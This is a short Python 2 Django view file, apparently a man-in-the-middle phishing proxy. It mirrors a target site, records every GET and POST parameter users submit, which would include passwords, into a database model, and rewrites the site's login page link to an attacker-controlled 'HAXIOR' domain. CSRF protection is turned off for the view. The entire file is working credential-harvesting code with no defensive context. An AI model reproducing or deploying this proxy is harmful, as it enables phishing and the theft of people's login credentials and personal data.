# -*- coding: utf-8 -*-

# from django.shortcuts import render
from django.http import HttpResponse
import httplib2
from urllib import urlencode
from django.conf import settings
from django.views.decorators.csrf import csrf_exempt
import json

from models import Dane

PROXY_FORMAT = u"http://%s/%s" % (settings.PROXY_DOMAIN, u"%s")

@csrf_exempt
def proxy(request, url):
    conn = httplib2.Http()
    # optionally provide authentication for server
    # conn.add_credentials('admin','admin-password')

    if request.method == "GET":
        url_ending = "%s?%s" % (url, urlencode(request.GET))
        url = PROXY_FORMAT % url_ending
        resp, content = conn.request(url, request.method)
        data_to_save = dict(request.GET.iterlists())
        if data_to_save:
            m = Dane()
            m.type = m.GET
            m.data = str(data_to_save)
            m.url = url
            m.save()
        return HttpResponse(content.replace(
                '%s/login/index.php' % settings.PROXY_DOMAIN,
                '%s/login/index.php' % settings.HAXIOR_DOMAIN
        ))
    elif request.method == "POST":
        url = PROXY_FORMAT % url
        data = urlencode(request.POST)
        resp, content = conn.request(url, request.method, data)
        data_to_save = dict(request.POST.iterlists())
        if data_to_save:
            m = Dane()
            m.type = m.POST
            m.data = str(data_to_save)
            m.url = url
            m.save()
        return HttpResponse(content)
